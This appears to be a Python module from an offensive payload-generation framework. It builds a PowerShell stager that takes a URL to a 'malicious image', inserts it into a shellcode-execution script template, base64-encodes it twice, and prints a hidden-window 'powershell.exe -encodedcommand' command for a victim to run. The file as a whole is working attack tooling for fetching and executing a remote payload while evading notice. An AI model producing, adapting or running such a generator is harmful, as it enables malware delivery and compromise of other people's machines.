from core.gzipwrapper import GzipWrapper
from module import ModuleObject
import base64

import os

class PsModule(ModuleObject):
    
    def __init__(self, ui):
        ModuleObject.__init__(self)
        self.ui = ui
        self.vars = {}
        self.vars["url"] = ["", "Url that point to the malicious image"]
        self.description = "Module to generate Powershell payload"
        self.module_name = "powershell"
        
    def run_action(self):
        stage1 = self.load_file("core/util/exec-sc.ps1").replace("[URL]", self.vars["url"][0])
        stage1 = base64.b64encode(stage1)
        stage2 = self.load_file("core/util/base64.ps1").replace("[BASE64]", stage1)
        self.ui.print_msg("Powershell script:")
        print "powershell.exe -nop -w hidden -encodedcommand %s" % base64.b64encode(stage2)
        
    def load_file(self, path):
        path = os.getcwd() + "/" + path
        if os.path.exists(path):
            return open(path, "rb").read()
        else:
            self.ui.print_error("%s not found" % path)
            return False
        
